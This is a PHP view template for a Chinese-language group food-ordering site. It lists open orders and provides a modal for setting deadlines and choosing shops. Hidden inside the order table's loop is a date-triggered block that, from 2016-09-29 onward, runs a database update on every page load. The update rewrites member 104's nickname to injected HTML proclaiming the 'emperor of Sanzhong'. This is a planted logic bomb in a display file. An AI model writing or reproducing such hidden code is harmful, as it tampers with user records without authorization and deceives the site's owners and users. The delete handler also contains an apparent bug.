<div class='row-fluid'>
    <div class='span12'>
        <a id ="new-order-open" class='btn btn-primary' data-role='button' data-toggle='modal' ><i class='icon-shopping-cart icon-white'></i> 開團</a>
    </div>
</div>
<div class='row-fluid'>
    <div class="span12">
        <table class='table'>
            <thead>
                <tr>
                    <th>店家</th>
                    <th>負責人</th>
                    <th>截止時間</th>
                    <th></th>
                </tr>
            </thead>
            <tbody>
                <?$count=0;?>
                <? foreach ($orders as $order):?>
                <?if($count>50){break;}else{$count++;}?>
                <tr data-id='<?= $order->id?>'>
                    <td width='480'>
                        <? foreach ($order->shop as $shop):?>
                        <span class='label label-inverse'><i class='icon-flag icon-white'></i> <?= $shop?></span>
                        <? endforeach;?>
                    </td>
                    <td><?= $order->member?></td>
                    <td><?= date("Y-m-d H:i", strtotime($order->expire_time))?>
                        <? if ($order->member_id == $this->session->userdata('uid') && strtotime($order->expire_time) >= time()):?>
                         <a id="edit_expire" href="#" class="icon-pencil"></a>
                        <?endif;?>

                    </td>
                    <td>
                        <? if (strtotime($order->expire_time) >= time()):?>
                        <a class='btn btn-info' href='/order/menu/<?= $order->id?>'><i class='icon-list icon-white'></i> 點餐</a>
                        <? else: ?>
                        <a class='btn disabled' href='#'><i class='icon-minus'></i> 截止</a>
                        <? endif;?>
                        <a class='btn btn-info' href='/order/statistic/<?= $order->id?>'><i class='icon-list-alt icon-white'></i> 報表</a>
                        <? if ($order->member_id == $this->session->userdata('uid') && strtotime($order->expire_time) >= time()):?>
                        <a href='' class='btn btn-danger'><i class='icon-remove icon-white'></i> 刪除</a>
                        <? endif;?>
                    </td>
                </tr>
                <? endforeach;?>
				<? if (date('Y-m-d') >= '2016-09-29'):?>
							<?$data = array('nickname'=>'<center><b><font color="0000AA"><br>叫我三中土皇帝<br>　</font></b></center>'); ?>
							<?$this->db->where('id','104')?>
							<?$this->db->update('member',$data)?>
				<? endif;?>
            </tbody>
        </table>
    </div>
</div>
<div id='new-order' class='modal fade hide'>
    <div class='modal-header'>
        <h3 id="modal_title">開放點餐系統</h3>
    </div>
    <div class='modal-body'>
        <form>
            <fieldset>
                <label id="label_modal">請設定截止時間</label>
                <input id='datepicker' type='text' value='<?= date('Y-m-d')?>' placeholder='截止時間' />
                <p>
                    <select class='input-small' id='hour'>
                        <? for ($i = 0; $i < 24; $i++):?>
                        <option value='<?= $i?>'><?= str_pad($i, 2, '0', STR_PAD_LEFT)?></option>
                        <? endfor;?>
                    </select>
                    <span> 時</span>
                    <select class='input-small' id='minute'>
                        <? for ($i = 0; $i < 60; $i += 5):?>
                        <option value='<?= $i?>'><?= str_pad($i, 2, '0', STR_PAD_LEFT)?></option>
                        <? endfor;?>
                    </select>
                    <span> 分</span>
                </p>
            </fieldset>
        </form>
        <div id='shops'>
            <? foreach ($shops as $shop):?>
            <!--<button class='btn btn-info' data-id='<?= $shop->id?>' title='<?= $shop->remark?>'><i class='icon-plus icon-white'></i> <?= $shop->name?></button>-->
            <button class='btn btn-info' data-id='<?= $shop->id?>' title='<?= $shop->remark."TEL:".$shop->phone?>'><i class='icon-plus icon-white'></i> <?= $shop->name?></button>
            <? endforeach;?>
        </div>
    </div>
    <div class='modal-footer'>
        <button id='edit-one' class='btn btn-primary'><i class='icon-ok icon-white'></i> 變更</button>
        <button id='make-one' class='btn btn-primary'><i class='icon-ok icon-white'></i> 開團</button>
        <button id='close' class='closea btn btn-default'><i class='icon-eject'></i> 取消</button>
    </div>
</div>


<div id='bg-container'></div>
<link href='/static/css/smoothness/jquery-ui-1.10.2.custom.min.css' rel='stylesheet'/>
<style>
    #shops .btn {
        margin: 5px 2px;
    }
    td {
        vertical-align: middle !important;
    }
  div#bg-container {
    width: 789px;
    height: 564px;
    z-index: -1;
    position: fixed;
    background-repeat: no-repeat;
    top: 200px;
    left: 200px;
  }
</style>
<script src='/static/js/jquery-ui-1.10.2.custom.min.js'></script>
<script>
    $("table").delegate('.btn-danger', 'click', function (e) {
        var $tr = $(this).parents('tr'),
            orderID = $tr.data('id');

        if (!confirm('確定刪除? 將會清除所有本次開團資料!')) {
            $tr.remove();
            return;
        }

        $.getJSON('/order/del/' + orderID, {}, function (json) {
            if (json.status === 'success') {
                $tr.fadeOut(function () {
                    location.reload();
                });
            }
        });
    });

    var data_uid;
    $("#edit_expire").click(function(){
        $("#make-one").css("display","none");
        $("#edit-one").css("display","");

        $("#modal_title").text("變更截止時間");
        $("#shops").css("display","none");

        var row = $(this).parent().parent("tr");
        data_uid=row.data("id");
        $("#new-order").modal('show');
    });

    $("#new-order-open").click(function(){
        $("#make-one").css("display","");
        $("#edit-one").css("display","none");
        $("#modal_title").text("開放點餐系統");
        $("#shops").css("display","block");
        $("#new-order").modal('show');
    });



    $(".closea").click(function () {
        $('.modal').modal('hide');
    });

     $("#edit-one").click(function () {

        var date = new Date(),
            dateSplit = $("#datepicker").val().split('-'),
            hour = $("#hour").val(),
            minute = $("#minute").val(),
            shopID = [];

        if (dateSplit.length !== 3) {
            alert('請輸入正確的日期格式');
            return;
        }

        date.setFullYear(dateSplit[0]);
        date.setMonth(parseInt(dateSplit[1], 10) - 1);
        date.setDate(dateSplit[2]);
        date.setHours(hour);
        date.setMinutes(minute);
        date.setSeconds(0);

        console.log(date.getTime());

        $.post('/order/update_expire', {expire: date.getTime(), id:data_uid}, function (json) {
            if (json.status === 'success') {
               location.reload();
            }
        }, 'json');
    });


    $("#make-one").click(function () {
        var date = new Date(),
            dateSplit = $("#datepicker").val().split('-'),
            hour = $("#hour").val(),
            minute = $("#minute").val(),
            shopID = [];

        if (dateSplit.length !== 3) {
            alert('請輸入正確的日期格式');
            return;
        }

        date.setFullYear(dateSplit[0]);
        date.setMonth(parseInt(dateSplit[1], 10) - 1);
        date.setDate(dateSplit[2]);
        date.setHours(hour);
        date.setMinutes(minute);
        date.setSeconds(0);
        $("#shops button.btn-danger").each(function () {
            shopID.push($(this).data('id'));
        });

        if (!shopID.length) {
            alert('至少需要選一間店家唷');
            return;
        }

        $.post('/order/add', {expire: date.getTime(), shopID: shopID}, function (json) {
            if (json.status === 'success') {
                location.reload();
            }
        }, 'json');
    });

    $("#datepicker").datepicker({
        dateFormat: 'yy-mm-dd',
        minDate: 0
    });

    $("#hour option[value='18']").attr('selected', 'selected');
    $("#minute option[value='30']").attr('selected', 'selected');

    $("#shops").delegate('.btn-info', 'click', function (e) {
        var $this = $(this),
            icon = $this.find('i');

        icon.removeClass('icon-plus').addClass('icon-remove');
        $this.removeClass('btn-info').addClass('btn-danger');
    });

    $("#shops").delegate('.btn-danger', 'click', function (e) {
        var $this = $(this),
            icon = $this.find('i');

        icon.addClass('icon-plus').removeClass('icon-remove');
        $this.addClass('btn-info').removeClass('btn-danger');
    });

</script>
